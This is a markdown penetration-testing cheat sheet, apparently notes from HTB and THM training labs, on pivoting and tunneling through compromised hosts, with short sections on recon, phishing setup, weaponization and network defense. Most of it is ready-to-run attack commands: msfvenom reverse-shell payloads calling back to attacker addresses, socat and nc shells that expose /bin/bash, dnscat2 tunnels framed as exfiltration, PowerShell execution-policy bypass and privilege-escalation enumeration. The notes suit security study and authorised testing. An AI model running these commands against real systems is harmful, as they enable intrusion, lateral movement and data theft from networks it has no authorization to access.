- [Basic Steps](#basic-steps)
  - [Active](#active)
- [PIVOTING](#pivoting)
  - [SSH](#ssh)
  - [Meterpreter Tunneling](#meterpreter-tunneling)
  - [PROXY](#proxy)
  - [SS](#ss)
  - [PLINK.EXE](#plinkexe)
  - [CHISEL](#chisel)
  - [SSHUTTLE](#sshuttle)
  - [SOCAT](#socat)
  - [Rpivot](#rpivot)
  - [Netsh](#netsh)
  - [DNS Tunneling](#dns-tunneling)
  - [ICMP Tunneling](#icmp-tunneling)
  - [Double Pivot](#double-pivot)
- [External Tools](#external-tools)
- [Phishing](#phishing)
- [Passive](#passive)
  - [recon-ng](#recon-ng)
  - [Weaponization](#weaponization)
- [Wireshark](#wireshark)
- [Fixes](#fixes)

## Basic Steps
- Enumerate
- Find everything that there is outside and inside
  - Number of machines
  - services running
  - Public interface
  - git server
  - public IP
    - arp
  - network connections
- find services running, find cve for these services
- stablish stable connection (pivoting): reverse shell, proxy, ssh, port forwarding, socat, sshuttle
- get ssh key if they are available
- upload/download files
- No dns if web: add to etc/hosts
- Pivot = Pivot host = Proxy = Foothold = Beach Head system = Jump host
- [Diagrams](https://app.diagrams.net/)

```mermaid
---
title: Scenario
---
flowchart TD
subgraph Z[" "]
direction LR
    A[Attacker]:::foo -->|direct access| B(Pivot):::bar ---> C(Target 2):::bar
    A[Attacker] --->|No Access| C(Target 2)
    classDef foo stroke:#f00
    classDef bar stroke:#0f0

end
```
- Tunneling != Pivoting
  - Tunneling = encapsulate
  - pivoting = accessing through segmentation
  - Lateral movement: [Palo Alto](https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement) | [Mitre](https://attack.mitre.org/tactics/TA0008/)

- Basic commands
  - netstat
    - -r route
  - ip
    - route

### Active
- interacting
- https://www.rapid7.com/db/
- searchsploit

## PIVOTING
-  from on machine to another
-  tunnelling/proxying: route all traffic (a lot of traffic)
-  port forwarding: create connection (few ports)
-  ProxyChain
- (linux) firewall-cmd --zone=public --add-port PORT/tcp
- (windows) netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT
- [Worth Reading](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)
- [Worth watching](https://www.youtube.com/watch?v=B3GxYyGFYmQ)

### SSH
- -o PubkeyAcceptedKeyTypes=ssh-rsa
  - declares SSH key type that client uses
- -o PasswordAuthentication=no
  - no password
- -o PreferredAuthentications=publickey,password,keyboard-interactive
- In the command: ~C = to execute ssh commands
[Port Forwarding](https://notes.benheater.com/books/network-pivoting)

```
# sshd_config
# config for specific user
Match junkuser
    PermitRootLogin no
    PermitTTY no
    PermitUserRC no
    ForceCommand "echo 'This account is for port forwarding only'"
    PasswordAuthentication yes
    PermitEmptyPasswords no
    MaxAuthTries 2   
    AllowAgentForwarding no
    X11Forwarding no
	X11UseLocalhost no
```

- SSH tunneling over socks proxy
  - socks: socks client ----> socks server (attacker) => traffic is routed through socks
  - socks4: no authentication, no UPD
  - socks5: authentication, UDP
  - open port on attacking

- **-L Local Port Forwarding**
  - when: we know which service is listening at which port
  - ssh -L [local_port]:target:[port_on_target] user@$TARGET -fN
  - ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
  - -f = background
  - -N no command execution
- **-D Dynamic Port Forwarding**
  - When: we dont know which services lie on the other side = forward traffic to target network
  - ssh -D SOCKS_LISTENER_PORT user@$TARGET
  - ssh -D 9050 user@$TARGET

- **-R Reverse/Remote Port Forwarding**
  - Send traffic from remote target to attacker
  - ssh Remote from pivot:8080 to attacker:8000
    - ssh -R InternalIPPivot:PivotPORT:0.0.0.0:LocalPort user@$PIVOT -vN

```
# meterpreter shell ==> Pivot:8080 --> Attacker:8000
# Example reverse shell for remote forwarding
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
  - use exploit/multi/handler
    - lhost: 0.0.0.0 - lport 8000
    - payload windows/x64/meterpreter/reverse_https
    - payload windows/x64/meterpreter/reverse_http
    - payload windows/x64/meterpreter_reverse_https

or http or inline

# Upload in windows (invoke-webrequest)
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

- Steps
  - Create msf reverse_shell (on attacker) http|https|stage|stageless
  - upload to pivot (to pivot)
  - start http server (on pivot)
  - download shell (remote target)
  - run ssh -R PivotInternalIp:port:Attacker0.0.0.0:Port User@PivotPublic + Dynamic
   

- Check forwarding
  - netstat -antp
    - -a: show all listening/non-listening sockets
    - -n: numerical address
    - -p: program/pid

### Meterpreter Tunneling
- Steps
1. Upload meterpreter shell on the pivot
2. Create listener (multi handler) on the attacker to listen to 1
3. Execute ping sweep on the internal network
4. Set up MSF sock proxy
5. Create routes to internal subnet found on the pivot (module | inside meterpreter)

- Meterpreter shell for pivot, that return commands to attacker

```
# Start multihandler
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

- Ping sweep to find address of the target

```
# Module
post/multi/gather/ping_sweep RHOSTS=ADD_NETWORK

# Direct on meterpreter
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# or
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
for i in {1..255}; do (ping -c 1 172.16.5.${i} | grep "bytes from" &); done
- c PACKET
- i time out

# Windows
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}


for /L %i in (1,1,255) do @ping -n 1 -w 172.16.5.%i >> nul && echo 172.16.5.%i is up
```

- ICMP blocked
  - TCP scan on ADD_NETWORK

- **Proxy**
```
# Set up proxy of metasploit
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a

jobs: check if it is running

# Route traffic via meterpreter session

use post/multi/manage/autoroute
set SESSION #
set SUBNET TARGET_NET

# or inside the meterpreter session
run autoroute -s 172.16.5.0/23
run autorute -p = list active routes
```

- **Local Port Forwarding**
  - portfwd module
```
portfwd add -l LISTEN -p TARGET_PORT -r Target_IP
portfwd add -l 3300 -p 3389 -r 172.16.5.19

xfreerdp localhost:3300 = xfreerdp target:3389
```

- **Rerverse Port Forwarding**
  - portfwd -R
```
portfwd add -R -l LOCAL_Port -p TARGET_PORT -L $ATTACKER
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

# Set up multi handler to listen
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081 
set LHOST 0.0.0.0 
```

  - Sheell on TARGET would send connection to Pivot:1234 and this send to Attacker:8081

```
# windows payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

### PROXY
- proxychains: route packaet over 9050, force application traffic to go through proxy
    - SOCKS Tunneling = packing command packet and forwarding to remote server
  - proxychains command
    - proxychains nmap -Pn -sT = host-alive NOT in windows (block ICMP), TCP Full
    - proxychains msfconsole@xfreerdp

```
#Proxychain
# /etc/proxychains.conf

socks4 	127.0.0.1 9050
```

- FoxyProxy
  - better for web

- Tools
  - [ssh-audit.py](https://github.com/jtesta/ssh-audit)

- Steps
  - create key pair on the attacking machine
  - transfer private key to victim
  - stablish connection from victim to attacking
  - ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
  - Browser: localhost
  - executing on we habe the shell

- **Reverse Connections**
  - generate ssh key
  - put .pub in authorized: command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-x11-forwading,no-pty ssh-rsa key
  - restart ssh
  - transfer private key to target: 
  - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
  - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN
  - In the end: delete key

### SS
- tool to investigate sockets
- -t: tcp sockets
- -u: udp sockets
- -l: listening
- -p: show process
- -n: dont resolve 

### PLINK.EXE
- command line for putty
- **Dynamic Port Forward**
  - plink -ssh -D 9050 user@$TARGET
    - ssh session betweent Attacker_windows <=> Pivot_linux
    - Listens on port 9050
- **Proxifier**
  - starts socket tunnel via ssh

- cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
- convert key with puttygen: puttygen key -o xxx.ppk

### CHISEL
- set up tunnel proxy / port forward
- TCP/UDP tunnel over HTTP secured via SSH
- client / server 
- [Download](https://github.com/jpillora/chisel.git)
  - [Releases](https://github.com/jpillora/chisel/releases)
  - [Description](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

- Steps
  - Download chisel
  - Build binary
  - [shrink its size - 24 min](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s)
  - Transfer to pivot
  - Start server on pivot to listen incoming connections
    - chisel server -v -p 1234 --socks5
  - Start client on attacker Connect pivot to Attacker
    - chisel client -v PIVOT:1234 socks
  - Adjust **proxychains** config to tun port
   - config socks5 127.0.0.1 1080

- Reverse SOCKS Proxy
  - server: chisel server -p [port] --reverse &
  - client (pivot): ./chisel client [attacker]:8005 R:socks &
    - R = remote, client knows that server antecipate proxy


- Forward SOCK Proxy
  - Pivot: ./chisel server -p LISTEN_PORT --socks5
  - attacker: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
  
- Port Forward
  - attacker: ./chisel server -p LISTEN_PORT --reverse &
  - Pivot to target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
  - Pivot to our machine: ./chisel server -p 1337 --reverse &
  
- Local Port Forward
  - attacker: ./chisel server -p LISTEN_PORT
  - Pivot: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
    - Victim: chisel client ATTACKER:PORT R:LOCALPORT:localhost:TargetPORT 

- In the machine with evil-win open firewall port
  - cd w
  - chisel client => attacking
  - chisel server => victim

### SSHUTTLE
- Easier to handle + Only SSH + No need of proxychains
- only with ssh

```
# install
apt-get install sshuttle

# Virtualenv
virtualenv -p python3 /tmp/sshuttle
. /tmp/sshuttle/bin/activate
pip install sshuttle
```

- sshuttle -r username@address Target_IP/Network 
- sshuttle -r ubuntu:'HTB_@cademy_stdnt!'@10.129.204.118 172.16.5.0/23 -v
  - -r pivot 
  - -N to guess the subnet
- No password:
  - sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
  - -x exclude compromised server
- Direct access to evil-winrM
  - evil-winrm -u pacoca -p 123456 -i 10.200.101.150
-Reset resolved.service: sudo systemctl restart systemd-resolved.service

### SOCAT
- Bidirectional ==> pipe socket ==> 2 independent network without SSH
  - mestasploit listener <==> socat on target
    - socat will listen on port 8080 and forward everything to attacker 80

```
# Reverse shell
socat TCP4-LISTEN:8080,fork TCP4:ATTACKER:80
```
  - Steps Reverse shell
    1.  Start socat listener on the pivot
    2.  Create payload for target
    3.  upload payload to the target
    4.  start multi handler on the attacker

```mermaid
---
title: Socat Diagramm Reverse Shell
---
flowchart TD
subgraph Z[" "]
direction LR
    C(Target 1) -->|8080| B(Pivot: Socat listens 8080):::bar -->|80| A[Attacker listens 80]:::foo
    D(Target 2) -->|8080| B(Pivot: Socat listens 8080):::bar 
    E(Target n) -->|8080| B(Pivot: Socat listens 8080):::bar 
    classDef foo stroke:#f00
    classDef bar stroke:#0f0
end
```

```mermaid
---
title: Socat Diagramm Bind Shell
---
flowchart TD
subgraph Z[" "]
direction LR
    A[Attacker]:::foo -->|8080| B(Pivot: Socat listens 8080):::bar -->|8443| C(Target 1 listens 8443) 
    B(Pivot: Socat listens 8080):::bar -->|8443| D(Target 2 listens 8443) 
    B(Pivot: Socat listens 8080):::bar -->|8443| E(Target n listens 8443) 
    classDef foo stroke:#f00
    classDef bar stroke:#0f0
end
```

```
# Bind shell
socat TCP4-LISTEN:8080,fork TCP4:TARGET:8443
```

- Port Forwarding - Method 1
  - open port on target + redirect to target server = ./socat tcp-l:[port_on_target],fork,reuseaddr tcp:[target_ip]:3306 &

- Method 2 -Quieter  
  - Attacker, opens to ports: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
  - target: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
- on target: ./socat tcp-l:8000 tcp:10.50.102.138:443 & => connect target back to us on port 443
- on target: ./nc 127.0.0.1 8000 -e /bin/bash ==> listen to port 8000 
- Port Forwarding [From_Pivot_to_TARGET]: ./socat tcp-l:[port_on_Pivot],fork,reuseaddr tcp:[IP_Target]:3306 &

- Encrypted:
  - Create key + Litener + Connect
  - Create certificate: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
  - merge keys: cat shell.key shell.crt > shell.pem
  - listener: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
  - connect back: socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
 close all:
  - jobs ==> find socats processes 

- Steps:
```
# Create key
openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt

# req = certificate
# -x509 = type of certificate
# -newkey rsa:4096 = type of key with size
# -days = valid
# -subj = organization, country
# -nodes = NOT encrypt private key
# -keyout PRIVATE = file with the private key
# -out Certificate = file to write certificate

# PEM = privace enhanced mail = concat .key + .cert
cat thm-reverse.key thm-reverse.crt > thm-reverse.pem.

# Start listener
socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT

# Connect
socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash

# Without encryption
  # Listener # socat -d -d TCP-LISTEN:4443,fork STDOUT
  # Victim   # socat TCP:10.20.30.129:4443 EXEC:/bin/bash
```

- With NC
```
nc -lvnp 443 -c "nc TARGET PORT"
  -c = --sh-exec
  -e = --exec
```


### Rpivot
- Reverse SOCKS proxy
- Similar to dynamic port forwarding, but this time we start it on the pivot
- [Tool](https://github.com/klsecservices/rpivot.git)

- Steps
  1. Start server.y on the target
    - server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
  2. Upload rpivot on the pivot
  3. Run client.py
    - client.py --server-ip $ATTACKER --server-port 9999
  4. Set up proxychains to pivot over local server on attacking machine
    - proxychains cmd Target:port
```
# Server
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Client
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

# Client with authentication
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>

# Proxychains
proxychains firefox-esr 172.16.5.135:80
```

### Netsh
- [Windows command line tool](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts)
  - Find routes + view firewall settings + add proxies + create port forwarding rules
- windows pivot
- Steps
  - On windows pivot start netsh and add proxy listen_port
  - on the attacker connect to pivot and forward listen_port

```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25 
- v4tov4: IPv4 to IPv4 (also 6-6, 4-6, 6-4)

# Verify
netsh.exe interface portproxy show v4tov4 all

# On attacker
xfreerdp /v:Pivot:listen_port
```

```mermaid
---
title: Netsh
---
flowchart TD
subgraph Z[" "]
direction LR
    A[Attacker]:::foo -->|8080| B(netsh listens 8080:PIVOT WINDOWS:Connect target):::bar -->|3389| C(Target 1)


    classDef foo stroke:#f00
    classDef bar stroke:#0f0
end
```

### DNS Tunneling
- [dnscat2](https://github.com/iagox86/dnscat2)
  - send data using DNS protocol
  - Inside TXT record
  - When local DNS server tries to resolver an address, data is exfiltrated and sent to network
  - Exfiltration

```
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install

# server (attacker)
sudo ruby dnscat2.rb --dns host=$ATTACKER,port=53,domain=inlanefreight.local --no-cache

# Client for windows
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Import module
Import-Module .\dnscat2.ps1

# Client (pivot): Create tunnel  use secret created by server
Start-Dnscat2 -DNSserver $ATTACKER -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
ruby dnscat.rb --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21
```

- [dnscat2-powershell: Client for windows](https://github.com/lukebaggett/dnscat2-powershell)


### ICMP Tunneling
- Encapsulate traffich withing ICMP packet
- For exfiltration
- [ptunnel](https://github.com/utoni/ptunnel-ng)
- Steps
  1. Create tunnel Pivot==Attacker
  2. Download ptunnel
  3. Build it on pivot
  4. Transfer to pivot
  5. Server on pivot
    - sudo ./ptunnel-ng -r$PIVOT -R22
  6. Client on attacker
    - sudo ./ptunnel-ng -p$PIVOT -l2222 -r$PIVOT -R22
  7. Proxy traffic through tunnel
  8. Connect to ssh using port 2222
    - ssh -p2222 -lUSER 127.0.0.1

- Also for Dynamic port forwading
  - ssh -D 9050 -p2222 -lUSER 127.0.0.1

### Double Pivot
- Socks with RDP

```mermaid
---
title: Double Pivot
---
flowchart TD
subgraph Z[" "]
direction LR
    A[Attacker]:::foo -->|RDP| B(Pivot 1):::bar -->|3389| C(Pivot 2) -->|3389| D(Target)
    classDef foo stroke:#f00
    classDef bar stroke:#0f0
end
```

- [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP)
- Dynamic Virtual Channels (DVC): tunnel packages over RDP
  - Normal usage: clipboard data, audio

- Steps
  1. Download [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
  2. Download [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
  3. Upload files to pivot
  4. Load SocksOVERRDP.dll
    - regsvr32.exe SocksOverRDP-Plugin.dll
  5. Connect to Pivot 2
    - mstsc.exe
  6. Transfer SocksOverRDP-Server.exe to target
  7. Start proxifier on Pivot 1
  8. Connected from Pivot 2 to target


## External Tools
- enum4linux IP_
- metasploit (smb/enum || ssh/enum)
- gobuster / ffuf
- lienum (linux): 
  - the file must be executed in the target
  - search for readble important files
- executables (SUID): find / -perm -u=s -type f 2>/dev/null 
- How to abuse of each executable: https://gtfobins.github.io/gtfobins/vim/

- PowerSploit (windows)
  - in the target 


## Phishing
- Steps
  - register domain name
  - ssl/tsl certificated
  - email server/account
  - Dns records
  - web server
  
- emlAnalyzer
  - --header
  - -u
  - --text
  - --extract-all

- GoPhish
  - manage phishing campaings

- Droppers
  - poison, downloaded file

## Passive
- whois
- nslookup -type=?? URL SERVER
- dig SERVER URL TYPE
- host
- Google Hacking Database
  - [intitle:"index of" "nginx.log"](https://www.exploit-db.com/google-hacking-database)
  - 
- Google
  - blabla site:
  - filetype:pdf  inurl:www.google.de
  - site:hs-worms.de filetype:docx
  - *intitle:index.of site:*
  - *intitle:login*
  - cache:url
  - https://web.dev/measure/
  - robots.txt

- Maltego
  - graphical

- DNS:
  - shodan.io [check black friday - https://www.shodan.io/]
  - https://viewdns.info/
  - https://threatintelligenceplatform.com/

### recon-ng
- Workspace:
  - workspace create NAME
  - db schmea = check database
- marketplace search MODULE
  - info, install, remove MODULE
- Modules
  - module search/load  
  - options list/set/unset

### Weaponization
- Developing malicious code
- https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development
- VBE
- HTA - Html application
- windows reverse shell
  - get-executionpolicy = for ps1 files
  - set-executionpolicy -Scote Currentuser remotesigned
  - powershell -ex bypass -File name.ps1

## Wireshark
- statistical of
  - protocol
  - ip
  - ports
  - services
- watch out
  - addreses in user
  - suspicious address
  - suspecious port
  - services in user
  - level of traffic
- Check queries
  - dns
  - http

## Fixes
- Check if new tools/hosts/traffic appear

```
- DNS records, network device backups, and DHCP configurations
- Full and current application inventory
- A list of all enterprise hosts and their location
- Users who have elevated permissions
- A list of any dual-homed hosts (More than one network interface)
- Keeping a visual network diagram of your environment
```

- **Identify Permiter**
```
- What exactly are we protecting?
- What are the most valuable assets the organization owns that need securing?
- What can be considered the perimeter of our network?
- What devices & services can be accessed from the Internet? (Public-facing)
- How can we detect & prevent when an attacker is attempting an attack?
- How can we make sure the right person &/or team receives alerts as soon as something isn't right?
- Who on our team is responsible for monitoring alerts and any actions our technical controls flag as potentially malicious?
- Do we have any external trusts with outside partners?
- What types of authentication mechanisms are we using?
- Do we require Out-of-Band (OOB) management for our infrastructure. If so, who has access permissions?
- Do we have a Disaster Recovery plan?
```

- **Internal considerations**
```
- Are any hosts that require exposure to the internet properly hardened and placed in a DMZ network?
- Are we using Intrusion Detection and Prevention systems within our environment?
- How are our networks configured? Are different teams confined to their own network segments?
- Do we have separate networks for production and management networks?
- How are we tracking approved employees who have remote access to admin/management networks?
- How are we correlating the data we are receiving from our infrastructure defenses and end-points?
- Are we utilizing host-based IDS, IPS, and event logs?
```